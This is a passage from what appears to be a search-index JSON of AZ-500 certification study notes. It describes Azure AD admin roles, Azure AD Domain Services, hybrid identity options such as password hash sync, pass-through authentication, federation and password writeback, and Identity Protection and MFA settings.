and design recommendations Office Apps Administrator Users in this role can manage Microsoft 365 apps' cloud settings. This includes managing cloud policies, self-service download management and the ability to view Office apps related report. This role additionally grants the ability to manage support tickets, and monitor service health within the main admin center. Users assigned to this role can also manage communication of new features in Office apps. Organizational Messages Writer Assign the Organizational Messages Writer role to users who need to do the following tasks:   -Write,\u00a0publish, and\u00a0delete\u00a0organizational messages using Microsoft 365 admin center or Microsoft Endpoint Manager  -Manage\u00a0organizational message delivery options using Microsoft 365 admin center or Microsoft Endpoint Manager  -Read\u00a0organizational message delivery results using Microsoft 365 admin center or Microsoft Endpoint Manager  -View\u00a0usage reports and most settings in the Microsoft 365 admin center, but can't make changes Partner Tier1 Support Don't use. This role has been deprecated and will be removed from Azure AD in the future. This role is intended for use by a few Microsoft resale partners, and isn't intended for general use. Partner Tier2 Support Don't use. This role has been deprecated and will be removed from Azure AD in the future. This role is intended for use by a few Microsoft resale partners, and isn't intended for general use. Password Administrator Users with this role have limited ability to manage passwords. This role doesn't grant the ability to manage service requests or monitor service health. Whether a Password Administrator can reset a user's password depends on the role the user is assigned.Users with this role\u00a0can't\u00a0do the following tasks:   -Can't change the credentials or reset MFA for members and owners of a role-assignable group. Permissions Management Administrator Assign the Permissions Management Administrator role to users who need to do the following tasks:   -Manage\u00a0all aspects of Entra Permissions Management, when the service is present Power Business Intelligence (BI) Administrator Users with this role have global permissions within Microsoft Power BI, when the service is present and the ability to manage support tickets and monitor service health. Power Platform Administrator Users in this role can create and manage all aspects of environments, Power Apps, Flows, Data Loss Prevention policies. Additionally, users with this role have the ability to manage support tickets and monitor service health. Printer Administrator Users in this role can register printers and manage all aspects of all printer configurations in the Microsoft Universal Print solution, including the Universal Print Connector settings. They can consent to all delegated print permission requests. Printer Administrators also have access to print reports. Printer Technician Users with this role can register printers and manage printer status in the Microsoft Universal Print solution. They can also read all connector information. Key task a Printer Technician can't do is set user permissions on printers and sharing printers. Privileged Authentication Administrator Assign the Privileged Authentication Administrator role to users who need to do the following tasks:   -Set\u00a0or\u00a0reset\u00a0any authentication method (including passwords) for any user, including Global Administrators.   -Delete\u00a0or\u00a0restore\u00a0any users, including Global Administrators. For more information, see Who can perform sensitive actions.   -Force users to re-register against existing nonpassword credential (such as MFA or FIDO) and revoke remember MFA on the device, prompting for MFA on the next sign-in of all users.   -Update\u00a0sensitive properties for all users. For more information, see Who can perform sensitive actions.   -Create\u00a0and\u00a0manage\u00a0support tickets in Azure and the Microsoft 365 admin center.   Users with this role can't do the following tasks:   -Can't manage per-user MFA in the legacy MFA management portal. The same functions can be accomplished using the Set-MsolUser commandlet Azure AD PowerShell module. Privileged Role Administrator Users with this role can manage role assignments in Azure Active Directory and within Azure AD Privileged Identity Management. They can create and manage groups that can be assigned to Azure AD roles. In addition, this role allows management of all aspects of Privileged Identity Management and administrative units. Privileged Role Administrator This role grants the ability to manage assignments for all Azure AD roles including the Global Administrator role. This role doesn't include any other privileged abilities in Azure AD like creating or updating users. However, users assigned to this role can grant themselves or others another privilege by assigning extra roles. Reports Reader Users with this role can view usage reporting data and the reports dashboard in Microsoft 365 admin center and the adoption context pack in Power Business Intelligence (Power BI). Additionally, the role provides access to all sign-in logs, audit logs, and activity reports in Azure AD and data returned by the Microsoft Graph reporting API. A user assigned to the Reports Reader role can access only relevant usage and adoption metrics. They don't have any admin permissions to configure settings or access the product-specific admin centers like Exchange. This role has no access to view, create, or manage support tickets. Search Administrator Users in this role have full access to all Microsoft Search management features in the Microsoft 365 admin center. Additionally, these users can view the message center, monitor service health, and create service requests. Search Editor Users in this role can create, manage, and delete content for Microsoft Search in the Microsoft 365 admin center, including bookmarks, questions and answers, and locations. Security Administrator Users with this role have permissions to manage security-related features in the Microsoft 365 Defender portal, Azure Active Directory Identity Protection, Azure Active Directory Authentication, Azure Information Protection, and Office 365 Security and compliance center. Security Operator Users with this role can manage alerts and have global read-only access on security-related features, including all information in Microsoft 365 security center, Azure Active Directory, Identity Protection, Privileged Identity Management and Office 365 Security &amp; compliance center. Security Reader Users with this role have global read-only access on security-related feature, including all information in Microsoft 365 security center, Azure Active Directory, Identity Protection, Privileged Identity Management, and the ability to read Azure Active Directory sign-in reports and audit logs, and in Office 365 Security and compliance center. Service Support Administrator Users with this role can create and manage support requests with Microsoft for Azure and Microsoft 365 services, and view the service dashboard and message center in the Azure portal and Microsoft 365 admin center. SharePoint Administrator Users with this role have global permissions within Microsoft SharePoint Online, when the service is present, and the ability to create and manage all Microsoft 365 groups, manage support tickets, and monitor service health. Skype for Business Administrator Users with this role have global permissions within Microsoft Skype for Business, when the service is present, and manage Skype-specific user attributes in Azure Active Directory. Additionally, this role grants the ability to manage support tickets and monitor service health, and to access the Teams and Skype for Business admin center. The account must also be licensed for Teams or it can't run Teams PowerShell cmdlets. Teams Administrator Users in this role can manage all aspects of the Microsoft Teams workload via the Microsoft Teams and Skype for Business admin center and the respective PowerShell modules. This includes, among other areas, all management tools related to telephony, messaging, meetings, and the teams themselves. This role additionally grants the ability to create and manage all Microsoft 365 groups, manage support tickets, and monitor service health. Teams Communications Administrator Users in this role can manage aspects of the Microsoft Teams workload related to voice and telephony. This includes the management tools for telephone number assignment, voice and meeting policies, and full access to the call analytics toolset. Teams Communications Support Engineer Users in this role can troubleshoot communication issues within Microsoft Teams and Skype for Business using the user call troubleshooting tools in the Microsoft Teams and Skype for Business admin center. Users in this role can view full call record information for all participants involved. This role has no access to view, create, or manage support tickets. Teams Communications Support Specialist Users in this role can troubleshoot communication issues within Microsoft Teams and Skype for Business using the user call troubleshooting tools in the Microsoft Teams and Skype for Business admin center. Users in this role can only view user details in the call for the specific user they've looked up. This role has no access to view, create, or manage support tickets. Teams Devices Administrator Users with this role can manage Teams-certified devices from the Teams admin center. This role allows viewing all devices at single glance, with ability to search and filter devices. The user can check details of each device including logged-in account, make and model of the device. The user can change the settings on the device and update the software versions. This role doesn't grant permissions to check Teams activity and call quality of the device. Tenant Creator Assign the Tenant Creator role to users who need to do the following tasks:   -Create\u00a0both Azure Active Directory and Azure Active Directory B2C tenants even if the tenant creation toggle is turned off in the user settings Usage Summary Reports Reader Users with this role can access tenant level aggregated data and associated insights in Microsoft 365 admin center for Usage and Productivity Score but can't access any user level details or insights. In Microsoft 365 admin center for the two reports, we differentiate between tenant level aggregated data and user level details. This role gives an extra layer of protection on individual user identifiable data, which was requested by both customers and legal teams. User Administrator Assign the User Administrator role to users who need to do the following tasks:   -Create users   -Update most user properties for all users, including all administrators   -Update sensitive properties (including user principal name) for some users   -Disable or enable some users   -Delete or restore some users   -Create and manage user views   -Create and manage all groups   -Assign licenses for all users, including all administrators   -Reset passwords   -Invalidate refresh tokens   -Update (FIDO) device keys   -Update password expiration policies   -Create and manage support tickets in Azure and the Microsoft 365 admin center   -Monitor service healthUsers with this role\u00a0can't\u00a0do the following tasks:   -Can't manage MFA.   -Can't change the credentials or reset MFA for members and owners of a role-assignable group.   -Can't manage shared mailboxes User Administrator Users with this role can\u00a0change passwords\u00a0for people who may have access to sensitive or private information or critical configuration inside and outside of Azure Active Directory. Changing the password of a user may mean the ability to assume that user's identity and permissions.   For example:   -Application Registration and Enterprise Application owners, who can manage credentials of apps they own. Those apps may have privileged permissions in Azure AD and elsewhere not granted to User Administrators. Through this path, a User Administrator may be able to assume the identity of an application owner and then further assume the identity of a privileged application by updating the credentials for the application.   -Azure subscription owners, who may have access to sensitive or private information or critical configuration in Azure.   -Security Group and Microsoft 365 group owners, who can manage group membership. Those groups may grant access to sensitive or private information or critical configuration in Azure AD and elsewhere.   -Administrators in other services outside of Azure AD like Exchange Online, Office Security and compliance center, and human resources systems.   -Nonadministrators\u00a0like executives, legal counsel, and human resources employees who may have access to sensitive or private information. Virtual Visits Administrator Users with this role can do the following tasks:   -Manage and configure all aspects of Virtual Visits in Bookings in the Microsoft 365 admin center, and in the Teams Electronic Health Record (EHR) connector   -View usage reports for Virtual Visits in the Teams admin center, Microsoft 365 admin center, and Power BI   -View features and settings in the Microsoft 365 admin center, but can't edit any settings Windows 365 Administrator Users with this role have global permissions on Windows 365 resources, when the service is present. Additionally, this role contains the ability to manage users and devices in order to associate policy and create and manage groups.  This role can create and manage security groups, but doesn't have administrator rights over Microsoft 365 groups. That means administrators can't update owners or memberships of Microsoft 365 groups in the organization. However, they can manage the Microsoft 365 group they create, which is a part of their end-user privileges. So, any Microsoft 365 group (not security group) they create is counted against their quota of 250.  Assign the Windows 365 Administrator role to users who need to do the following tasks:   -Manage Windows 365 Cloud PCs in Microsoft Endpoint Manager  -Enroll and manage devices in Azure AD, including assigning users and policies  -Create and manage security groups, but not role-assignable groups  -View basic properties in the Microsoft 365 admin center  -Read usage reports in the Microsoft 365 admin center  -Create and manage support tickets in Azure and the Microsoft 365 admin center Windows Update Deployment Administrator Users in this role can create and manage all aspects of Windows Update deployments through the Windows Update for Business deployment service. The deployment service enables users to define settings for when and how updates are deployed, and specify which updates are offered to groups of devices in their tenant. It also allows users to monitor the update progress. Yammer Administrator Assign the Yammer Administrator role to users who need to do the following tasks:   -Manage\u00a0all aspects of Yammer  -Create,\u00a0manage, and\u00a0restore\u00a0Microsoft 365 Groups, but not role-assignable groups  -View the hidden members of Security groups and Microsoft 365 groups, including role assignable groups  -Read usage reports\u00a0in the Microsoft 365 admin center  -Create\u00a0and\u00a0manage\u00a0service requests in the Microsoft 365 admin center  -View announcements\u00a0in the Message center, but not security announcements  -View\u00a0service health","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#15-deploy-azure-active-directory-domain-services","title":"1.5. Deploy Azure Active Directory Domain Services","text":"<p>Azure Active Directory Domain Services (Azure AD DS) provides managed domain services such as domain join, group policy, lightweight directory access protocol (LDAP), and Kerberos/New Technology LAN Manager (NTLM) authentication. You use these domain services without the need to deploy, manage, and patch domain controllers (DCs) in the cloud.</p> <p>Azure AD DS integrates with your existing Azure AD tenant. This integration lets users sign in to services and applications connected to the managed domain using their existing credentials.</p> <p>When you create an Azure AD DS managed domain, you define a unique namespace. This namespace is the domain name, such as\u00a0aaddscontoso.com. Two Windows Server domain controllers (DCs) are then deployed into your selected Azure region. This deployment of DCs is known as a replica set. You can expand a managed domain to have more than one replica set per Azure AD tenant. Replica sets can be added to any peered virtual network in any Azure region that supports Azure AD DS. You don't need to manage, configure, or update these DCs. The Azure platform handles the DCs as part of the managed domain, including backups and encryption at rest using Azure Disk Encryption.</p> <p>Azure AD DS replicates identity information from Azure AD, so it works with Azure AD tenants that are cloud-only or synchronized with an on-premises AD DS environment. Azure AD DS performs a one-way synchronization from Azure AD to provide access to a central set of users, groups, and credentials. You can create resources directly in the managed domain (Azure ADDS), but they aren't synchronized back to Azure AD.</p> <p></p> <p>Concepts:</p> <p>Azure Active Directory (Azure AD) - Cloud-based\u00a0identity and mobile device management that provides user account and authentication services for resources such as Microsoft 365, the Azure portal, or SaaS applications.</p> <p>Azure AD can be synchronized with an on-premises AD DS environment to provide a single identity to users that works natively in the cloud.</p> <p>Active Directory Domain Services (AD DS)\u00a0-\u00a0Enterprise-ready lightweight directory access protocol (LDAP) server\u00a0that provides key features such as identity and authentication, computer object management, group policy, and trusts.</p> <p>AD DS is a central component in many organizations with an on-premises IT environment and provides core user account authentication and computer management features.</p> <p>Azure Active Directory Domain Services (Azure AD DS)\u00a0-\u00a0Provides managed domain services\u00a0with a subset of fully compatible traditional AD DS features such as domain join, group policy, LDAP, and Kerberos / New Technology LAN Manager (NTLM) authentication.</p> <p>Azure AD DS integrates with Azure AD, which can synchronize with an on-premises AD DS environment. This ability extends central identity use cases to traditional web applications that run in Azure as part of a lift-and-shift strategy.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#16-create-and-manage-azure-ad-users","title":"1.6. Create and manage Azure AD users","text":"<p>Note for deleted users:</p> <p>The user is deleted and no longer appears on the\u00a0Users\u00a0-\u00a0All users\u00a0page. The user can be seen on the\u00a0Deleted users\u00a0page for the next\u00a030 days\u00a0and can be restored during that time. When a user is deleted, any licenses consumed by the user are made available for other users.</p> <p>To update the identity, contact information, or job information for users whose source of authority is Windows Server Active Directory, you must use Windows Server Active Directory. After you complete the update, you must wait for the next synchronization cycle to complete before you see the changes.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#17-manage-users-with-azure-ad-groups","title":"1.7. Manage users with Azure AD groups","text":"<p>Azure AD lets you use groups to manage access to applications, data, and resources. Resources can be:</p> <ul> <li>Part of the Azure AD organization, such as permissions to manage objects through roles in Azure AD</li> <li>External to the organization, such as for Software as a Service (SaaS) apps</li> <li>Azure services</li> <li>SharePoint sites</li> <li>On-premises resources</li> </ul> <p>There are\u00a0two group types\u00a0and\u00a0three group membership types.</p> <p>Group types: - Security: Used to manage user and computer access to shared resources. - Microsoft 365: Provides collaboration opportunities by giving group members access to a shared mailbox, calendar, files, SharePoint sites, and more.</p> <p>Membership types:</p> <ul> <li>Assigned: Lets you add specific users as members of a group and have unique permissions.</li> <li>Dynamic user: Lets you use dynamic membership rules to automatically add and remove members. If a member's attributes change, the system looks at your dynamic group rules for the directory to see if the member meets the rule requirements (is added), or no longer meets the rules requirements (is removed).</li> <li>Dynamic device: Lets you use dynamic group rules to automatically add and remove devices. If a device's attributes change, the system looks at your dynamic group rules for the directory to see if the device meets the rule requirements (is added), or no longer meets the rules requirements (is removed).</li> </ul> <p>You can create a dynamic group for either devices or users but not for both. You can't create a device group based on the device owners' attributes. Device membership rules can only reference device attributions.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#18-configure-azure-ad-administrative-units","title":"1.8. Configure Azure AD administrative units","text":"<p>An administrative unit can contain only users and groups. Administrative units restrict permissions in a role to any portion of your organization that you define. You could, for example, use administrative units to delegate the Helpdesk Administrator role to regional support specialists.</p> <p>To use administrative units, you need an Azure Active Directory Premium license for each administrative unit admin, and Azure Active Directory Free licenses for administrative unit members.</p> <p>Available roles for Azure AD administrative units</p> Role Description Authentication Administrator Has access to view, set, and reset authentication method information for any non-admin user in the assigned administrative unit only. Groups Administrator Can manage all aspects of groups and groups settings, such as naming and expiration policies, in the assigned administrative unit only. Helpdesk Administrator Can reset passwords for non-administrators and Helpdesk administrators in the assigned administrative unit only. License Administrator Can assign, remove, and update license assignments within the administrative unit only. Password Administrator Can reset passwords for non-administrators and Password Administrators within the assigned administrative unit only. User Administrator Can manage all aspects of users and groups, including resetting passwords for limited admins within the assigned administrative unit only.","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#19-passwordless-authentication","title":"1.9. Passwordless authentication","text":"<p>Microsoft global Azure and Azure Government offer the following\u00a0three\u00a0passwordless authentication options that integrate with Azure Active Directory (Azure AD):</p> <ol> <li>Windows Hello for Business: Windows Hello for Business is ideal for information workers that have their own designated Windows PC. The biometric and PIN credentials are directly tied to the user's PC, which prevents access from anyone other than the owner. With public key infrastructure (PKI) integration and built-in support for single sign-on (SSO), Windows Hello for Business provides a convenient method for seamlessly accessing corporate resources on-premises and in the cloud.</li> <li>Microsoft Authenticator: You can also allow your employee's phone to become a passwordless authentication method. You may already be using the Authenticator app as a convenient multi-factor authentication option in addition to a password. You can also use the Authenticator App as a passwordless option.</li> <li>Fast Identity Online2 (FIDO2) security keys: The FIDO (Fast IDentity Online) Alliance helps to promote open authentication standards and reduce the use of passwords as a form of authentication. FIDO2 is the latest standard that incorporates the web authentication (WebAuthn) standard. Users can register and then select a FIDO2 security key at the sign-in interface as their main means of authentication. These FIDO2 security keys are typically USB devices but could also use Bluetooth or Near-Field Communication (NFC).</li> </ol>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#2-implement-hybrid-identity","title":"2. Implement Hybrid Identity","text":"<p>Hybrid Identity is the process of connecting your on-premises Active Directory with your Azure Active Directory. </p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#21-deploy-azure-ad-connect","title":"2.1. Deploy Azure AD connect","text":"<p>Azure AD Connect will integrate your on-premises directories with Azure Active Directory.</p> <p>Azure AD Connect provides the following features:</p> <ul> <li>Password hash synchronization. A sign-in method that synchronizes a hash of a users on-premises AD password with Azure AD.</li> <li>Pass-through authentication. A sign-in method that allows users to use the same password on-premises and in the cloud, but doesn't require the additional infrastructure of a federated environment.</li> <li>Federation integration. Federation is an optional part of Azure AD Connect and can be used to configure a hybrid environment using an on-premises AD FS infrastructure. It also provides AD FS management capabilities such as certificate renewal and additional AD FS server deployments.</li> <li>Synchronization. Responsible for creating users, groups, and other objects. As well as, making sure identity information for your on-premises users and groups is matching the cloud. This synchronization also includes password hashes.</li> <li>Health Monitoring. Azure AD Connect Health can provide robust monitoring and provide a central location in the Azure portal to view this activity.</li> </ul> <p>Azure Active Directory (Azure AD) Connect Health\u00a0provides robust monitoring of your on-premises identity infrastructure. It enables you to maintain a reliable connection to Microsoft 365 and Microsoft Online Services. With Azure AD Connect the key data you need is easily accessible. You can view and act on alerts, setup email notifications for critical alerts, and view performance data. Using AD Connect Health works by installing an agent on each of your on-premises sync servers.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#23-introduction-to-authentication","title":"2.3 Introduction to Authentication","text":"<p>Identity is the new control plane of IT security. When the Azure AD hybrid identity solution is your new control plane, authentication is the foundation of cloud access. All the other advanced security and user experience features in Azure AD depends on your authentication method.</p> <p>Azure AD supports the following authentication methods for hybrid identity solutions:</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#cloud-authentication","title":"Cloud authentication","text":"<p>Azure AD handles users' sign-in process. \u00a0Coupled with seamless single sign-on (SSO), users can sign in to cloud apps without having to reenter their credentials.</p> <p>Option 1: Azure AD password hash synchronization.\u00a0The simplest way to enable authentication for on-premises directory objects in Azure AD.</p> <p>Option 2: Azure AD Pass-through Authentication.\u00a0Provides a simple password validation for Azure AD authentication services by using a software agent that runs on one or more on-premises servers. The servers validate the users directly with your on-premises Active Directory, which ensures that the password validation doesn't happen in the cloud. Companies with a security requirement to immediately enforce on-premises user account states, password policies, and sign-in hours might use this authentication method.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#federal-authentication","title":"Federal authentication","text":"<p>Azure AD hands off the authentication process to a separate trusted authentication system, such as on-premises Active Directory Federation Services (AD FS), to validate the user\u2019s password. The authentication system can provide additional advanced authentication requirements. Examples are smartcard-based authentication or third-party multifactor authentication.</p> <p>So, which one is more appropiate for your organization? See this decision tree:</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#24-azure-ad-password-hash-synchronization-phs","title":"2.4. Azure AD Password Hash Synchronization (PHS)","text":"<p>Password hash synchronization\u00a0(PHS) is a feature used to synchronize user passwords from an on-premises Active Directory instance to a cloud-based Azure AD instance. Use this feature to sign in to Azure AD services like Microsoft 365, Microsoft Intune, CRM Online, and Azure Active Directory Domain Services (Azure AD DS). You sign in to the service by using the same password you use to sign in to your on-premises Active Directory instance. </p> <p>How does syncronization work? In the background, the password synchronization component takes the user\u2019s password hash from on-premises Active Directory, encrypts it, and passes it as a string to Azure. Azure decrypts the encrypted hash and stores the password hash as a user attribute in Azure AD. When the user signs in to an Azure service, the sign-in challenge dialog box generates a hash of the user\u2019s password and passes that hash back to Azure. Azure then compares the hash with the one in that user\u2019s account. If the two hashes match, then the two passwords must also match and the user receives access to the resource. The dialog box provides the facility to save the credentials so that the next time the user accesses the Azure resource, the user will not be prompted.</p> <p>It is important to understand that this is\u00a0same sign-in, not single sign-on. The user still authenticates against two separate directory services, albeit with the same user name and password. This solution provides a simple alternative to an AD FS implementation.</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#25-azure-ad-pass-through-authentication-pta","title":"2.5. Azure AD Pass-through Authentication (PTA)","text":"<p>Azure AD Pass-through Authentication\u00a0(PTA) allows users to sign in to both on-premises and cloud-based applications using the same user account and passwords. When users sign-in using Azure AD, Pass-through authentication validates the users\u2019 passwords directly against an organization's on-premise Active Directory. Benefits:</p> <ul> <li>Supports user sign-in into all web browser-based applications and into Microsoft Office client applications that use modern authentication.</li> <li>Sign-in usernames can be either the on-premises default username (userPrincipalName) or another attribute configured in Azure AD Connect (known as Alternate ID).</li> <li>Works seamlessly with conditional access features such as Azure Active Directory Multi-Factor Authentication to help secure your users.</li> <li>Integrated with cloud-based self-service password management, including password writeback to on-premises Active Directory and password protection by banning commonly used passwords.</li> <li>Multi-forest environments are supported if there are forest trusts between your AD forests and if name suffix routing is correctly configured.</li> <li>PTA is a free feature, and you don't need any paid editions of Azure AD to use it.</li> <li>PTA can be enabled via Azure AD Connect.</li> <li>PTA uses a lightweight on-premises agent that listens for and responds to password validation requests.</li> <li>Installing multiple agents provides high availability of sign-in requests.</li> <li>PTA protects your on-premises accounts against brute force password attacks in the cloud.</li> </ul> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#26-azure-ad-federation","title":"2.6. Azure AD Federation","text":"<p>Federation is a collection of domains that have established trust. The level of trust may vary, but typically includes authentication and almost always includes authorization. A typical federation might include a number of organizations that have established trust for shared access to a set of resources. You can federate your on-premises environment with Azure AD and use this federation for authentication and authorization. This sign-in method ensures that all user authentication occurs on-premises. This method allows administrators to implement more rigorous levels of access control.</p> <p>If you decide to use Federation with Active Directory Federation Services (AD FS), you can optionally set up password hash synchronization as a backup in case your AD FS infrastructure fails.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#27-configure-password-writeback","title":"2.7. Configure password writeback","text":"<p>Password writeback\u00a0is a feature enabled with Azure AD Connect that allows password changes in the cloud to be written back to an existing on-premises directory in real time.</p> <p>To use\u00a0self-service password reset (SSPR)\u00a0you must have already configured Azure AD Connect in your environment.</p> <p>Password writeback provides:</p> <ul> <li>Enforcement of on-premises Active Directory Domain Services password policies. When a user resets their password, it is checked to ensure it meets your on-premises Active Directory Domain Services policy before committing it to that directory. This review includes checking the history, complexity, age, password filters, and any other password restrictions that you have defined in local Active Directory Domain Services.</li> <li>Zero-delay feedback. Password writeback is a synchronous operation. Your users are notified immediately if their password did not meet the policy or could not be reset or changed for any reason.</li> <li>Supports password changes from the access panel and Microsoft 365. When federated or password hash synchronized users come to change their expired or non-expired passwords, those passwords are written back to your local Active Directory Domain Services environment.</li> <li>Supports password writeback when an admin resets them from the Azure portal. Whenever an admin resets a user\u2019s password in the Azure portal, if that user is federated or password hash synchronized, the password is written back to on-premises. This functionality is currently not supported in the Office admin portal.</li> <li>Doesn\u2019t require any inbound firewall rules. Password writeback uses an Azure Service Bus relay as an underlying communication channel. All communication is outbound over port 443.</li> </ul> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#3-microsoft-entra-id-protection-identity-protection","title":"3. Microsoft Entra ID Protection (Identity Protection)","text":"<p>Risk detections in Azure AD Identity Protection include any identified suspicious actions related to user accounts in the directory. The signals generated that are fed to Identity Protection, can be further fed into tools like Conditional Access to make access decisions, or fed back to a security information and event management (SIEM) tool for further investigation based on your organization's enforced policies.</p> <p>For your organization to be protected you can have:</p> <ul> <li>Azure AD Identity Protection policies can automatically block a sign-in attempt or require additional action, such as requiring a password change or prompt for Azure AD Multi-Factor Authentication. </li> <li>These policies work with existing Azure AD Conditional Access policies as an extra layer of protection for your organization.</li> </ul> <p>Some of the following actions may trigger Azure AD Identity Protection risk detection:</p> <ul> <li>Users with leaked credentials.</li> <li>Sign-ins from anonymous IP addresses.</li> <li>Impossible travel to atypical locations.</li> <li>Sign-ins from infected devices.</li> <li>Sign-ins from IP addresses with suspicious activity.</li> </ul> <p>Azure Active Directory Identity Protection includes three default policies that administrators can choose to enable: </p> <p>The insight you get for a detected risk detection is tied to your Azure AD subscription.  </p> <ul> <li>MFA registration policy\u00a0-  Identity Protection can help organizations roll out Azure Multi-Factor Authentication using a Conditional Access policy requiring registration at sign-in.  Makes sure users are registered for Azure AD Multi-Factor Authentication. If a sign-in risk policy prompts for MFA, the user must already be registered for Azure AD Multi-Factor Authentication.</li> <li>Sign-in risk policy\u00a0- Identity Protection analyzes signals from each sign-in, both real-time and offline, and calculates a risk score based on the probability that the sign-in wasn't performed by the user. Administrators can decide based on this risk score signal to enforce organizational requirements. Administrators can choose to block access, allow access, or allow access but require multi-factor authentication. Administrators can also choose to create a custom Conditional Access policy, including sign-in risk as an assignment condition.</li> <li>User risk policy\u00a0- Identifies and responds to user accounts that may have compromised credentials. Can prompt the user to create a new password.</li> </ul> <p></p> <p>When you enable a policy user or sign-in risk policy, you can also choose the threshold for risk level -\u00a0low and above,\u00a0medium and above, or\u00a0high. This flexibility lets you decide how aggressive you want to be in enforcing any controls for suspicious sign-in events.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#31-implement-user-risk-policy","title":"3.1. Implement user risk policy","text":"<p>Identity Protection can calculate what it believes is normal for a user's behavior and use that to base decisions for their risk. User risk is a calculation of probability that an identity has been compromised. Administrators can decide based on this risk score signal to enforce organizational requirements. Administrators can choose to block access, allow access, or allow access but require a password change using Azure AD self-service password reset.</p> <p>The risky users report includes these data: </p> <ul> <li>Which users are at risk, have had risk remediated, or have had risk dismissed?</li> <li>Details about detections</li> <li>History of all risky sign-ins</li> <li>Risk history</li> </ul> <p>Administrators can then choose to act on these events. Administrators can choose to:</p> <ul> <li>Reset the user password</li> <li>Confirm user compromise</li> <li>Dismiss user risk</li> <li>Block user from signing in</li> <li>Investigate further using Azure ATP</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#32-implement-sign-in-risk-policy","title":"3.2. Implement sign-in risk policy","text":"<p>Sign-in risk represents the probability that a given authentication request isn't authorized by the identity owner. For users of Azure Identity Protection, sign-in risk can be evaluated as part of a Conditional Access policy. Sign-in Risk Policy supports the following conditions:</p> <ul> <li>Location: When configuring location as a condition, organizations can choose to include or exclude locations. \u00a0These named locations may include the public IPv4 network information, country or region, or even unknown areas that don't map to specific countries or regions.</li> <li>Client apps: Conditional Access policies by default apply to browser-based applications and applications that utilize modern authentication protocols. In addition to these applications, administrators can choose to include Exchange ActiveSync clients and other clients that utilize legacy protocols.</li> <li>Risky sign-ins: The risky sign-ins report contains filterable data for up to the past 30 days (1 month). With the information provided by the risky sign-ins report, administrators can find:<ul> <li>Which sign-ins are classified as at risk, confirmed compromised, confirmed safe, dismissed, or remediated. </li> <li>Real-time and aggregate risk levels associated with sign-in attempts.</li> <li>Detection types triggered.</li> <li>Conditional Access policies applied</li> <li>MFA details</li> <li>Device information</li> <li>Application information</li> <li>Location information</li> </ul> </li> </ul> <p>Administrators can then choose to take action on these events. Administrators can choose to:</p> <ul> <li>Confirm sign-in compromise</li> <li>Confirm sign-in safe</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#33-deploy-multifactor-authentication-in-azure","title":"3.3. Deploy multifactor authentication in Azure","text":"<p>For organizations that need to be compliant with industry standards, such as the Payment Card Industry (PCI) Data Security Standard (DSS) version 3.2, MFA is a must have capability to authenticate users. Beyond being compliant with industry standards, enforcing MFA to authenticate users can also help organizations to mitigate credential theft attacks.</p> <p>Methods</p> <p>Call to phone: Places an automated voice call. The user answers the call and presses # in the phone keypad to authenticate. The phone number is not synchronized to on-premises Active Directory. A voice call to phone is important because it persists through a phone handset upgrade, allowing the user to register the mobile app on the new device.</p> <p>Text message to phone: Sends a text message that contains a verification code. The user is prompted to enter the verification code into the sign-in interface. This process is called one-way SMS. Two-way SMS means that the user must text back a particular code. Two-way SMS is deprecated and not supported after November 14, 2018. Users who are configured for two-way SMS are automatically switched to call to phone verification at that time.</p> <p>Notification through mobile app: Sends a push notification to your phone or registered device. The user views the notification and selects Approve to complete verification. The Microsoft Authenticator app is available for Windows Phone, Android, and iOS. Push notifications through the mobile app provide the best user experience.</p> <p>Verification code from mobile app: The Microsoft Authenticator app generates a new OATH verification code every 30 seconds. The user enters the verification code into the sign-in interface. The Microsoft Authenticator app is available for Windows Phone, Android, and iOS. Verification code from mobile app can be used when the phone has no data connection or cellular signal.</p> <p>Settings</p> <ul> <li>Account lockout: The account lockout settings let you specify how many failed attempts to allow before the account becomes locked out for a period of time. \u00a0The account lockout settings are only applied when a pin code is entered for the MFA prompt. The following settings are available: Number of MFA denials to trigger account lockout, Minutes until account lockout counter is reset, Minutes until account is automatically unblocked. </li> <li>Block and unblock users: If a user's device has been lost or stolen, you can block authentication attempts for the associated account.</li> <li>Fraud alerts: Configure the fraud alert feature so that your users can report fraudulent attempts to access their resources. Code to report fraud during initial greeting: When users receive a phone call to perform two-step verification, they normally press # to confirm their sign-in. To report fraud, the user enters a code before pressing #. This code is 0 by default, but you can customize it.</li> <li>Notification: Email notifications can be configured when users report fraud alerts.</li> <li>OATH tokens: Azure AD supports the use of OATH-TOTP SHA-1 tokens that refresh codes every 30 or 60 seconds. Customers can purchase these tokens from the vendor of their choice.</li> <li>Trusted IPs:  Trusted IPs is a feature to allow federated users or IP address ranges to bypass two-step authentication. Notice there are two selections in this screenshot.<ul> <li>Managed tenants. For managed tenants, you can specify IP ranges that can skip MFA. </li> <li>Federated tenants. For federated tenants, you can specify IP ranges and you can also exempt AD FS claims users.</li> </ul> </li> 